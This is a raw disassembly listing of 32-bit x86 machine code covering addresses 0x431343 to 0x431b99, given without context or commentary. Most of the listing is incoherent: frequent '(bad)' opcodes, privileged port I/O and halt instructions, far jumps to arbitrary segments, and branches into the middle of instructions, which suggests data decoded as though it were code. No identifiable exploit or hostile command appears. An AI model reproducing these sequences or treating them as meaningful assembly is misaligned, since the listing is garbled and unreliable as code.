  431343:	test   BYTE PTR [ebp-0x2300bc],0xb6
  43134a:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  431354:	dec    edi
  431355:	pop    es
  431356:	add    ah,ch
  431358:	mov    DWORD PTR [ebp+0x68],eax
  43135b:	in     eax,dx
  43135c:	inc    DWORD PTR [ebp-0x7d]
  43135f:	out    0xc0,al
  431361:	inc    ebp
  431362:	mov    edx,esp
  431364:	push   0x45
  431366:	(bad)  
  431367:	jmp    0xdf925924
  43136c:	add    BYTE PTR [ebp-0x77],al
  43136f:	out    dx,al
  431370:	ins    BYTE PTR es:[edi],dx
  431371:	inc    ebp
  431372:	jmp    edi
  431374:	add    DWORD PTR [ebp-0x14],0x7e
  431378:	mov    esi,esi
  43137a:	outs   dx,BYTE PTR ds:[esi]
  43137b:	inc    esp
  43137c:	(bad)  
  43137d:	mov    esp,0x8341b68d
  431382:	mov    DWORD PTR [esi+0x70],eax
  431385:	fcos   
  431387:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  43138d:	in     al,dx
  43138e:	jb     0x431315
  431390:	(bad)  
  431391:	dec    DWORD PTR [ebx-0x7aba9901]
  431397:	mov    edi,edi
  431399:	fdivr  st,st(7)
  43139b:	out    dx,eax
  43139c:	rcl    BYTE PTR [ebx],0x66
  43139f:	mov    DWORD PTR [ebp-0xc70075],eax
  4313a5:	(bad)  
  4313a6:	std    
  4313a7:	cmp    eax,DWORD PTR [eax]
  4313a9:	jne    0x431411
  4313ab:	mov    DWORD PTR [ebp-0xba0048],eax
  4313b1:	in     al,dx
  4313b2:	outs   dx,BYTE PTR ds:[esi]
  4313b3:	pushf  
  4313b4:	add    BYTE PTR [ebx-0x7f7a039a],cl
  4313ba:	inc    DWORD PTR [ecx]
  4313bc:	inc    DWORD PTR [eax]
  4313be:	jae    0x4313f8
  4313c0:	add    BYTE PTR [ebp+0x850266],al
  4313c6:	inc    DWORD PTR [ebp-0x1]
  4313c9:	mov    eax,eax
  4313cb:	jl     0x431433
  4313cd:	add    BYTE PTR [ebp-0x740077],al
  4313d3:	cld    
  4313d4:	dec    eax
  4313d5:	add    BYTE PTR [eax],0x1
  4313d8:	data16 add BYTE PTR [ebp+0x38],al
  4313dc:	mov    eax,0x47c2
  4313e1:	mov    eax,0x824f89
  4313e6:	inc    edi
  4313e7:	mov    DWORD PTR [edx+0x64],ebp
  4313ea:	inc    WORD PTR [ebp-0x75]
  4313ee:	(bad)  
  4313ef:	data16 rol BYTE PTR [ebp-0x16001a],1
  4313f6:	inc    ebp
  4313f7:	jge    0x4313d8
  4313f9:	add    bh,ah
  4313fb:	lea    ax,[ebp-0x750030]
  431402:	add    al,0x46
  431405:	jmp    0x40ff:0x8885
  43140b:	push   DWORD PTR [ebp+0x52]
  43140e:	lea    eax,[eax]
  431410:	shl    BYTE PTR [esi-0x7b],1
  431413:	test   esi,edi
  431415:	(bad)  
  431416:	(bad)  
  431417:	inc    DWORD PTR [ebp-0x990140]
  43141d:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  431423:	inc    edi
  431424:	push   ecx
  431425:	xor    ax,WORD PTR [ebp-0x8d0045]
  43142c:	add    al,al
  43142e:	ret    
  43142f:	mov    ax,WORD PTR [ebp-0x3f0004]
  431436:	push   eax
  431437:	mov    DWORD PTR [ebp-0x77],0xff98748b
  43143e:	add    BYTE PTR [ebx-0x764f8839],al
  431444:	push   DWORD PTR [esi+0x1]
  431447:	inc    DWORD PTR [eax]
  431449:	mov    eax,0xff99ff
  43144e:	or     BYTE PTR [ecx-0x7a87bb],cl
  431454:	jne    0x43140e
  431456:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  431460:	mov    ecx,0xd74fb8
  431465:	add    cl,al
  431467:	mov    DWORD PTR [ecx-0x3f007784],ecx
  43146d:	or     DWORD PTR [ebx+0x558966dc],0x7e
  431474:	(bad)  
  431475:	push   ebp
  431477:	mov    eax,0x8c2789
  43147c:	ret    0x6689
  43147f:	adc    BYTE PTR [ebp+0x48],0x8d
  431483:	add    bh,ah
  431485:	mov    WORD PTR [ebp-0x70],ax
  431489:	(bad)  
  43148a:	ret    0x667d
  43148d:	or     BYTE PTR [ebp-0x77],dl
  431490:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431497:	loop   0x431422
  431499:	(bad)  
  43149a:	xchg   esi,eax
  43149b:	aam    0xcf
  43149d:	out    dx,al
  43149e:	mov    DWORD PTR [esi-0x68],edi
  4314a1:	inc    ebp
  4314a2:	dec    edx
  4314a3:	pop    ecx
  4314a4:	mov    edx,DWORD PTR [eax]
  4314a6:	repnz push bp
  4314a9:	or     BYTE PTR [ebx+0x55106638],0x49
  4314b0:	(bad)  
  4314b1:	repnz xor eax,0xa0898945
  4314b7:	mov    ah,0x89
  4314b9:	jmp    DWORD PTR [edx+0x66b0418d]
  4314bf:	inc    DWORD PTR [ebp+0x50]
  4314c2:	add    DWORD PTR [ebp-0x5],0xffffffbe
  4314c6:	mov    DWORD PTR [eax],ecx
  4314c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4314c9:	pop    es
  4314ca:	inc    ecx
  4314cb:	(bad)  
  4314cc:	data16 fwait
  4314ce:	inc    ebp
  4314cf:	xor    ah,BYTE PTR [esi+0x3]
  4314d2:	dec    ebp
  4314d3:	push   eax
  4314d4:	inc    bp
  4314d6:	jge    0x43145b
  4314d8:	mov    esp,DWORD PTR [esi-0x18]
  4314db:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  4314e1:	add    DWORD PTR [ebx],esi
  4314e3:	add    BYTE PTR [ebx],al
  4314e5:	test   DWORD PTR [ebx],esi
  4314e7:	(bad)  
  4314e8:	inc    WORD PTR [ebp+0x0]
  4314ec:	mov    eax,DWORD PTR [eax]
  4314ee:	call   0x8898cc23
  4314f3:	mov    esi,eax
  4314f5:	clc    
  4314f6:	ret    
  4314f7:	rol    cl,0xa
  4314fa:	mov    DWORD PTR ds:0x7c0ec88,esi
  431500:	mov    edx,edi
  431502:	pushf  
  431503:	pop    es
  431504:	jmp    FWORD PTR [edx+0x66]
  431507:	add    BYTE PTR [ebp-0x990175],al
  43150d:	inc    ebp
  43150e:	test   DWORD PTR [ebx-0x2f00f202],eax
  431514:	push   ebp
  431515:	mov    edi,eax
  431517:	mov    dh,BYTE PTR [eax+0x266ff51]
  43151d:	push   ebp
  43151e:	add    BYTE PTR [ebx-0x764b0777],al
  431524:	dec    DWORD PTR [esi+0x661851e8]
  43152a:	add    BYTE PTR [ebp-0x7b],dl
  43152d:	cmp    esi,0xfffffffb
  431530:	dec    DWORD PTR [ecx+0x51fe9285]
  431536:	jmp    DWORD PTR [esi-0x75]
  431539:	push   ebp
  43153a:	hlt    
  43153b:	data16 (bad) 
  43153d:	dec    ebp
  43153e:	ret    
  43153f:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  431545:	lea    edx,[eax-0x1]
  431548:	jne    0x43151b
  43154a:	dec    DWORD PTR [ecx-0x2f7a63f8]
  431550:	dec    BYTE PTR [ecx+0x51559eff]
  431556:	mov    DWORD PTR [esi-0x4c],esp
  431559:	push   ebp
  43155a:	jmp    DWORD PTR [esi-0x18]
  43155d:	inc    ebp
  43155e:	sbb    BYTE PTR [ebp-0x767ad900],cl
  431564:	(bad)  
  431565:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431566:	inc    eax
  431568:	test   DWORD PTR [esi-0x2],esp
  43156b:	inc    ebp
  43156c:	dec    DWORD PTR [ebp-0x760bde75]
  431572:	(bad)  
  431573:	test   al,0xc3
  431575:	mov    DWORD PTR [ebp-0x769b56],ecx
  43157b:	lods   al,BYTE PTR ds:[esi]
  43157c:	push   eax
  43157d:	inc    ebp
  43157e:	jne    0x43158f
  431580:	dec    DWORD PTR [ebp+0x8]
  431583:	mov    ecx,DWORD PTR [ebx]
  431585:	sbb    al,0x0
  431587:	(bad)  
  431588:	mov    eax,0xc14fc3
  43158d:	mov    DWORD PTR [ecx-0xbabf64],ecx
  431593:	movsx  ecx,WORD PTR [ebp+0x4e]
  431597:	xor    eax,DWORD PTR [eax]
  431599:	add    eax,edi
  43159b:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  4315a1:	xor    edi,DWORD PTR [eax+0x854f66]
  4315a7:	dec    BYTE PTR [ecx-0x76bb01]
  4315ad:	mov    BYTE PTR [ebx-0x76724001],al
  4315b3:	pushf  
  4315b4:	inc    esi
  4315b5:	(bad)  
  4315b6:	dec    DWORD PTR [ebp-0x7abe6373]
  4315bc:	sar    esi,0x89
  4315bf:	dec    DWORD PTR [eax+0x0]
  4315c2:	inc    DWORD PTR [eax]
  4315c4:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  4315cb:	xlat   BYTE PTR ds:[ebx]
  4315cc:	dec    edx
  4315cd:	add    bh,bh
  4315cf:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  4315d5:	lea    esp,[esi-0x50]
  4315d8:	(bad)  
  4315d9:	(bad)  
  4315da:	call   DWORD PTR [eax-0x1]
  4315dd:	inc    ebp
  4315de:	rdpmc  
  4315e0:	add    BYTE PTR [ebx],al
  4315e2:	push   ax
  4315e4:	lea    eax,[ebp-0x1]
  4315ea:	js     0x4315eb
  4315ec:	add    al,bh
  4315ee:	push   bp
  4315f0:	lea    ecx,[ebp-0x7701]
  4315f6:	fmul   DWORD PTR [ebp-0x7a997800]
  4315fc:	(bad)  
  4315fd:	(bad)  
  4315fe:	(bad)  
  4315ff:	(bad)  
  431600:	jmp    DWORD PTR [ecx-0x7676ffb3]
  431606:	dec    eax
  431607:	mov    eax,0x8d8dffff
  43160c:	mov    al,0xb0
  43160e:	(bad)  
  43160f:	call   DWORD PTR [ecx+0x50]
  431612:	dec    ebp
  431613:	inc    ebp
  431614:	mov    esi,0x7030833
  431619:	push   eax
  43161a:	into   
  43161b:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  431621:	call   DWORD PTR [ecx-0x8]
  431624:	lea    edx,[ebp-0x1]
  431627:	jmp    0x76182b
  43162c:	inc    eax
  43162d:	jnp    0x4315bc
  43162f:	add    dh,bh
  431631:	inc    WORD PTR [ebp-0x8a00b0]
  431638:	mov    edx,eax
  43163a:	inc    esp
  43163b:	add    bh,bh
  43163d:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  431643:	dec    DWORD PTR [ebx-0x7f820301]
  431649:	add    BYTE PTR [ecx],al
  43164b:	data16 add BYTE PTR [ebp-0xb30077],al
  431652:	inc    eax
  431654:	(bad)  
  431655:	dec    si
  431657:	test   edi,edi
  431659:	(bad)  
  43165a:	cmp    edi,edi
  43165c:	add    ecx,DWORD PTR [edi-0x39]
  43165f:	mov    edx,DWORD PTR [edx+0x66]
  431662:	inc    DWORD PTR [ebp-0x3d00cb]
  431668:	mov    eax,0x66ff8b5e
  43166e:	jmp    0xb4ff:0xc7ff3895
  431675:	push   ecx
  431676:	inc    DWORD PTR [ebx-0x76ffccbb]
  43167c:	call   DWORD PTR [esi-0x1]
  43167f:	dec    DWORD PTR [eax]
  431681:	mov    ecx,0x805ff
  431686:	inc    ebp
  431687:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  43168d:	mov    ecx,0x35784
  431692:	add    BYTE PTR [ecx-0xffa59b],cl
  431698:	inc    ebp
  431699:	mov    ecx,0x9c6131
  43169e:	(bad)  
  43169f:	mov    eax,ebx
  4316a1:	pop    esp
  4316a2:	test   edi,edi
  4316a4:	clc    
  4316a5:	lea    eax,[ebp-0x24]
  4316a8:	cmp    eax,0xc7fe9c8d
  4316ad:	push   eax
  4316af:	lea    eax,[ebp+0x45fff8fe]
  4316b5:	mov    esi,DWORD PTR [ecx]
  4316b7:	hlt    
  4316b8:	lahf   
  4316b9:	push   esp
  4316ba:	mov    edx,DWORD PTR [ecx-0x4]
  4316bd:	xor    eax,DWORD PTR [eax+0x7201bb]
  4316c3:	add    BYTE PTR [ebp-0x35],al
  4316c6:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  4316cc:	mov    edx,DWORD PTR [ecx-0x74]
  4316cf:	rol    BYTE PTR [eax],0x8d
  4316d2:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  4316d6:	nop
  4316d7:	push   ecx
  4316d8:	add    bh,bh
  4316da:	mov    esp,edi
  4316dc:	in     al,0x85
  4316de:	jge    0x4316de
  4316e0:	test   edi,edi
  4316e2:	jne    0x431669
  4316e4:	(bad)  
  4316e5:	(bad)  
  4316e6:	sbb    bh,bh
  4316e8:	push   ebp
  4316e9:	inc    ebp
  4316ea:	call   0xffdc117a
  4316ef:	add    BYTE PTR [ebp+0x66],al
  4316f2:	mov    edx,DWORD PTR [ebp-0xfc0075]
  4316f8:	cmp    al,0x85
  4316fa:	ud0    eax,DWORD PTR [ebp-0x1]
  4316fe:	test   DWORD PTR [edi+0x74],ecx
  431701:	dec    edi
  431702:	inc    DWORD PTR [ebp-0x50004]
  431708:	dec    DWORD PTR [edi-0x75]
  43170b:	dec    esi
  43170c:	cld    
  43170d:	test   DWORD PTR [eax+0xff01ff],eax
  431713:	icebp  
  431714:	add    BYTE PTR [edi-0x3a],cl
  431717:	test   ebx,eax
  431719:	inc    BYTE PTR [ebp-0x1]
  43171c:	jne    0x43171e
  43171e:	mov    eax,DWORD PTR [eax]
  431720:	cld    
  431721:	xor    BYTE PTR [ecx+0x500155],cl
  431727:	push   ebp
  431728:	xor    DWORD PTR [ecx+0x45011c80],ecx
  43172e:	add    BYTE PTR [ebp+0x35e90f50],al
  431734:	add    al,BYTE PTR [eax]
  431736:	add    BYTE PTR [ebx-0x38fe4f80],al
  43173c:	add    ah,ch
  43173e:	or     BYTE PTR [ebp+0x4501f845],dh
  431744:	jmp    0xdf1a3a
  431749:	(bad)  
  43174a:	nop    ecx
  43174d:	test   DWORD PTR [ebp+0x4502f8],eax
  431753:	xor    ecx,DWORD PTR [ebp-0x64]
  431756:	mov    eax,edi
  431758:	mov    ebx,DWORD PTR [eax+edx*2]
  43175b:	add    eax,0x45fef885
  431760:	dec    DWORD PTR [ebx+0x339445]
  431766:	add    ecx,DWORD PTR [ecx+0x4500f889]
  43176c:	dec    DWORD PTR [ebx-0x460f0375]
  431772:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431773:	add    esi,edi
  431775:	add    bh,bh
  431777:	rdpmc  
  431779:	add    BYTE PTR [ebx],0x1
  43177c:	mov    DWORD PTR [eax],eax
  43177e:	add    al,0x45
  431780:	dec    DWORD PTR [ecx-0x360b3373]
  431786:	dec    DWORD PTR [esi]
  431788:	push   eax
  431789:	jne    0x4317d0
  43178b:	mov    esi,DWORD PTR [ebx]
  43178d:	cld    
  43178e:	add    esp,ecx
  431790:	push   eax
  431791:	inc    DWORD PTR [ebp-0x75]
  431794:	add    eax,0x800e4
  431799:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43179f:	mov    DWORD PTR [ecx],eax
  4317a1:	sbb    al,0x0
  4317a3:	leave  
  4317a4:	test   DWORD PTR [edi-0x2],eax
  4317a7:	jne    0x4317a8
  4317a9:	call   0xff4401ae
  4317ae:	xor    BYTE PTR [ebp+0x4d],al
  4317b1:	mov    edi,edi
  4317b3:	enter  0x8,0x4d
  4317b7:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  4317bd:	mov    eax,DWORD PTR [eax]
  4317bf:	cld    
  4317c0:	add    DWORD PTR [ecx],ebx
  4317c2:	inc    ebp
  4317c3:	dec    ebp
  4317c4:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  4317ca:	inc    eax
  4317cb:	dec    DWORD PTR [ecx-0x270375]
  4317d1:	add    BYTE PTR [ebx-0x39d72701],cl
  4317d7:	xchg   ecx,eax
  4317d8:	ret    
  4317d9:	add    BYTE PTR [ebp-0x830075],al
  4317df:	add    BYTE PTR [ebp-0x75],al
  4317e2:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  4317e8:	lea    edi,[edi-0xc]
  4317eb:	add    bh,bh
  4317ed:	mov    edx,DWORD PTR [eax-0x7b]
  4317f0:	inc    ebp
  4317f1:	rdpmc  
  4317f3:	jne    0x4317f8
  4317f5:	add    BYTE PTR [eax-0x75],dl
  4317f8:	inc    ebp
  4317f9:	clc    
  4317fa:	add    eax,0x400009
  4317ff:	mov    DWORD PTR [ebx-0x7f000304],ecx
  431805:	mov    eax,DWORD PTR [ecx]
  431807:	in     al,dx
  431808:	add    dh,al
  43180a:	test   ebx,eax
  43180c:	inc    BYTE PTR [ebp-0xff0001]
  431812:	add    BYTE PTR [ebp-0x43],al
  431815:	cmp    esi,0xfffffff8
  431818:	(bad)  
  431819:	push   DWORD PTR [eax]
  43181b:	add    BYTE PTR [ebp-0x3a],dl
  43181e:	test   ebx,eax
  431820:	je     0x4317a7
  431822:	mov    edi,edi
  431824:	sbb    al,0xff
  431826:	test   DWORD PTR gs:[eax],eax
  431829:	(bad)  
  43182a:	js     0x43182b
  43182c:	add    BYTE PTR [ebx-0x39b20bdd],cl
  431832:	sub    eax,ebx
  431834:	mov    ecx,DWORD PTR [ebx-0x55130377]
  43183a:	add    eax,DWORD PTR [eax]
  43183c:	dec    ebp
  43183d:	push   eax
  43183e:	mov    al,BYTE PTR [ebp+0x1]
  431841:	mov    eax,DWORD PTR [ebp-0x68]
  431844:	mov    eax,DWORD PTR [eax]
  431846:	sbb    bh,al
  431848:	or     ah,dh
  43184a:	dec    ebp
  43184b:	inc    DWORD PTR [eax+0x4]
  43184e:	push   ecx
  43184f:	add    BYTE PTR [edx-0x1],dh
  431852:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  431858:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  431862:	add    ecx,DWORD PTR [ecx-0x1be77477]
  431868:	push   ecx
  431869:	cmp    BYTE PTR [ebx],al
  43186b:	inc    ebp
  43186c:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  431872:	(bad)  
  431873:	(bad)  
  431874:	in     al,0xff
  431876:	add    BYTE PTR [ebp+0x0],al
  431879:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  43187f:	add    al,bh
  431881:	(bad)  
  431882:	jmp    0x8d85:0x74b0558d
  431889:	dec    DWORD PTR [eax]
  43188b:	call   DWORD PTR [ebp-0x7b]
  43188e:	mov    edi,esi
  431890:	lock call DWORD PTR [ebp-0x75]
  431894:	mov    esi,esp
  431896:	mov    ah,0xc6
  431898:	mov    bh,0xc3
  43189a:	mov    DWORD PTR [ebx-0x110003c4],ecx
  4318a0:	add    DWORD PTR [eax],0x450050ff
  4318a6:	mov    DWORD PTR [ebx+0x9598cc],ecx
  4318ac:	inc    edi
  4318ae:	push   esp
  4318b0:	jmp    0xcd00:0x650481ff
  4318b7:	mov    DWORD PTR [ebx],esi
  4318b9:	clc    
  4318ba:	cmp    edi,0xff9cff3c
  4318c0:	jne    0x4318ca
  4318c2:	mov    eax,eax
  4318c4:	add    esi,DWORD PTR [eax]
  4318c6:	int3   
  4318c7:	inc    ebp
  4318c8:	cmp    al,0x83
  4318ca:	add    BYTE PTR [eax],bl
  4318cc:	adc    DWORD PTR [ebx+0x768b5055],eax
  4318d2:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  4318d8:	mov    edi,eax
  4318da:	cmp    BYTE PTR [ebp+0x45],cl
  4318dd:	jmp    0x43186a
  4318df:	mov    ebx,DWORD PTR [esp+ebp*8]
  4318e2:	inc    ebp
  4318e3:	or     al,0x2
  4318e5:	dec    DWORD PTR [ebp+0x18]
  4318e8:	jne    0x43193f
  4318ea:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  4318f0:	mov    edi,DWORD PTR [ebx]
  4318f2:	in     al,0x50
  4318f4:	xchg   ecx,eax
  4318f5:	jmp    0x34367fa
  4318fa:	adc    al,0x8b
  4318fc:	inc    ebp
  4318fd:	mov    al,ds:0x8b04008b
  431902:	push   ebp
  431903:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  431909:	push   ebp
  43190a:	test   DWORD PTR [ebx-0x2800d701],ecx
  431910:	inc    ebp
  431911:	dec    ebp
  431912:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431918:	mov    DWORD PTR [eax],0xe9ff00f4
  43191e:	add    al,0x0
  431920:	add    BYTE PTR [eax],al
  431922:	mov    eax,edx
  431924:	push   eax
  431925:	rol    DWORD PTR [ebp-0xf0177],1
  43192b:	bound  eax,QWORD PTR [ebp+0x50]
  43192e:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  431934:	add    BYTE PTR [ecx+0x558df0ff],cl
  43193a:	mov    al,0xf
  43193c:	test   DWORD PTR [edx],edx
  43193e:	call   DWORD PTR [ebp-0x7a0001]
  431944:	(bad)  
  431945:	loop   0x431946
  431947:	jnp    0xc6990d4d
  43194d:	mov    eax,ebx
  43194f:	cmp    al,0x8b
  431951:	(bad)  
  431952:	cld    
  431953:	shr    esi,0xc
  431956:	add    dl,al
  431958:	push   eax
  431959:	lea    eax,[ebp-0x1]
  43195c:	mov    edx,esi
  43195e:	cwde   
  43195f:	cli    
  431960:	add    BYTE PTR [ebp+0x1ffff8ff],al
  431966:	or     BYTE PTR [eax],cl
  431968:	inc    ebp
  431969:	dec    ebp
  43196a:	inc    DWORD PTR [ebx+0x74803914]
  431970:	add    DWORD PTR [ebx+0x451800],ecx
  431976:	call   DWORD PTR [eax+edx*1]
  431979:	add    ecx,DWORD PTR [ebp-0x34]
  43197c:	push   edi
  43197d:	adc    al,0x8
  43197f:	mov    edx,DWORD PTR [ebp-0x14]
  431982:	mov    ecx,DWORD PTR [ebp+0x18]
  431985:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  431989:	inc    DWORD PTR [eax+esi*8]
  43198c:	inc    ebp
  43198d:	stos   BYTE PTR es:[edi],al
  43198e:	mov    edx,DWORD PTR [ebp-0x4]
  431991:	add    DWORD PTR [ebp-0x1c],eax
  431994:	mov    edx,DWORD PTR [ebp-0x70]
  431997:	cmp    eax,DWORD PTR [eax]
  431999:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43199a:	mov    eax,DWORD PTR [eax]
  43199c:	cld    
  43199d:	jae    0x43191f
  43199f:	add    eax,DWORD PTR [ecx]
  4319a1:	clc    
  4319a2:	add    BYTE PTR [eax+0x30],dl
  4319a5:	mov    DWORD PTR [ecx],esi
  4319a7:	clc    
  4319a8:	pop    ds
  4319a9:	inc    ebp
  4319aa:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  4319b0:	(bad)  
  4319b1:	push   DWORD PTR [edi]
  4319b3:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  4319b9:	(bad)  
  4319ba:	jae    0x4319bb
  4319bc:	mov    eax,DWORD PTR [ebp-0x740175]
  4319c2:	sub    eax,DWORD PTR [eax]
  4319c4:	add    eax,DWORD PTR [eax]
  4319c6:	mov    DWORD PTR [ecx+0x5f],eax
  4319c9:	mov    DWORD PTR [ebx-0x4],ebx
  4319cc:	ret    0xff
  4319cf:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  4319d5:	ret    
  4319d6:	mov    eax,DWORD PTR [ebp-0x6f0075]
  4319dc:	add    BYTE PTR [ebp-0x7d],al
  4319df:	mov    DWORD PTR [eax],eax
  4319e1:	add    al,0x84
  4319e3:	inc    DWORD PTR [ecx]
  4319e5:	lea    eax,[eax]
  4319e7:	hlt    
  4319e8:	sar    bh,cl
  4319ea:	test   BYTE PTR [eax+0x1],dl
  4319ed:	inc    ebp
  4319ee:	add    BYTE PTR [ebx],dh
  4319f0:	test   BYTE PTR [ebx],0x84
  4319f3:	push   eax
  4319f4:	add    BYTE PTR [ebp+0x0],al
  4319f7:	add    eax,0x86
  4319fc:	add    BYTE PTR [ebx-0x7f7b0340],cl
  431a02:	add    BYTE PTR [ecx],al
  431a04:	add    BYTE PTR [eax],al
  431a06:	mov    esi,0x550030
  431a0b:	mov    ecx,DWORD PTR [edi]
  431a0d:	cld    
  431a0e:	fidiv  DWORD PTR [ebp+0x0]
  431a11:	mov    edi,DWORD PTR [ecx]
  431a13:	xor    BYTE PTR [eax+eax*1],0x84
  431a17:	add    eax,DWORD PTR [eax]
  431a19:	sbb    BYTE PTR [eax],al
  431a1b:	jne    0x4319ce
  431a1d:	mov    eax,DWORD PTR [ecx]
  431a1f:	sbb    BYTE PTR [eax],al
  431a21:	mov    DWORD PTR [ebp-0x1],esp
  431a24:	add    BYTE PTR [eax+0x30e45ca],bh
  431a2a:	ret    0xb7fc
  431a2d:	dec    ebp
  431a2e:	or     al,0x89
  431a30:	dec    ebp
  431a31:	cld    
  431a32:	cmovne ecx,DWORD PTR [eax-0x75]
  431a36:	add    edi,esp
  431a38:	seto   BYTE PTR [esi-0x72ffffff]
  431a3f:	inc    ebp
  431a40:	adc    al,0x8b
  431a42:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  431a49:	cmp    DWORD PTR [edi+0x72],edx
  431a4c:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  431a52:	gs cmp al,0x0
  431a55:	je     0x431a2d
  431a57:	push   eax
  431a58:	sar    BYTE PTR [eax],1
  431a5a:	mov    bh,0x3e
  431a5c:	push   cs
  431a5d:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  431a63:	add    DWORD PTR [ecx+0x12],ebp
  431a66:	dec    edx
  431a67:	(bad)  
  431a68:	mov    eax,edx
  431a6a:	in     al,dx
  431a6b:	adc    DWORD PTR [ecx],esi
  431a6d:	pop    esi
  431a6e:	inc    ecx
  431a6f:	leave  
  431a70:	or     DWORD PTR [eax],ebx
  431a72:	gs push ebp
  431a74:	add    ah,ch
  431a76:	into   
  431a77:	in     al,dx
  431a78:	enter  0xb756,0xf0
  431a7c:	push   cs
  431a7d:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  431a87:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  431a8d:	jnp    0x74439f95
  431a93:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431a99:	add    BYTE PTR [edi],cl
  431a9b:	mov    edi,DWORD PTR [ecx-0x78]
  431a9e:	ltr    WORD PTR [ecx-0x7b]
  431aa2:	dec    DWORD PTR [edi]
  431aa4:	clc    
  431aa5:	out    0x45,eax
  431aa7:	add    BYTE PTR [eax],cl
  431aa9:	cmp    ebx,0xffffff8c
  431aac:	jge    0x431aae
  431aae:	jb     0x431ac0
  431ab0:	je     0x521b30
  431ab6:	pop    edx
  431ab7:	push   esi
  431ab8:	mov    ecx,DWORD PTR [edi]
  431aba:	in     al,dx
  431abb:	rol    DWORD PTR [ebp+0x0],1
  431abe:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431ac5:	cmp    DWORD PTR [ecx],0xfffffff0
  431ac8:	hlt    
  431ac9:	mov    esp,DWORD PTR [eax+0xf034d2b]
  431acf:	(bad)  
  431ad1:	push   eax
  431ad2:	jns    0xb842ff50
  431ad8:	lock push cs
  431ada:	ror    edx,0x3
  431add:	test   BYTE PTR [ecx+0x5500e800],cl
  431ae3:	dec    eax
  431ae4:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431ae8:	(bad)  
  431ae9:	mov    esi,0x7f33ff5f
  431aee:	inc    eax
  431aef:	test   DWORD PTR [edx],eax
  431af1:	je     0x431ab3
  431af3:	mov    ecx,ecx
  431af5:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431af9:	and    eax,DWORD PTR [eax+0xf0103]
  431aff:	jp     0x431aed
  431b01:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431b05:	add    edx,DWORD PTR [edi+0x74]
  431b08:	sbb    BYTE PTR [ebp+0x4d001484],cl
  431b0e:	add    BYTE PTR [ebp-0x74c48bbb],al
  431b14:	je     0x431a99
  431b16:	cmp    eax,edi
  431b18:	js     0x431b3d
  431b1a:	add    eax,0xeb0fc003
  431b1f:	jns    0x431aac
  431b21:	vmread DWORD PTR [ecx+0x45],ebx
  431b25:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431b2b:	adc    al,0x8b
  431b2d:	jge    0x431b43
  431b2f:	mov    edi,DWORD PTR [eax-0x4]
  431b32:	add    edi,DWORD PTR [edi]
  431b34:	or     bh,bh
  431b36:	push   ebp
  431b37:	push   es
  431b38:	mov    DWORD PTR [ebp-0x4],ebx
  431b3b:	add    edi,esi
  431b3d:	pop    es
  431b3e:	add    esi,DWORD PTR [edi-0x48ccf183]
  431b44:	mov    DWORD PTR [esp+esi*8],ecx
  431b47:	inc    ebp
  431b48:	pop    ebp
  431b49:	xor    DWORD PTR [esi-0x4],0x3b
  431b4d:	add    edx,DWORD PTR [ecx+edi*1]
  431b50:	push   es
  431b51:	clc    
  431b52:	mov    bh,0xdb
  431b54:	jp     0x431b0d
  431b56:	add    cl,BYTE PTR [esi]
  431b58:	div    DWORD PTR [edi+0x4d8b0c1c]
  431b5e:	test   edi,edi
  431b60:	je     0x431b56
  431b62:	mov    eax,ecx
  431b64:	or     BYTE PTR [ebx],al
  431b66:	dec    BYTE PTR [ecx+0x7d3bec7d]
  431b6c:	jbe    0x431be0
  431b6e:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  431b74:	add    ecx,DWORD PTR [esi]
  431b76:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  431b7c:	add    eax,DWORD PTR [ebx-0x287af783]
  431b82:	je     0x431bd1
  431b84:	mov    DWORD PTR [ecx],edi
  431b86:	mov    esi,eax
  431b88:	hlt    
  431b89:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431b90:	jb     0x431b52
  431b92:	jmp    0x431b7f
  431b94:	xor    esi,DWORD PTR [ebx]
  431b96:	pop    edi
  431b97:	pop    esi
  431b98:	pop    ebx
  431b99:	ret    
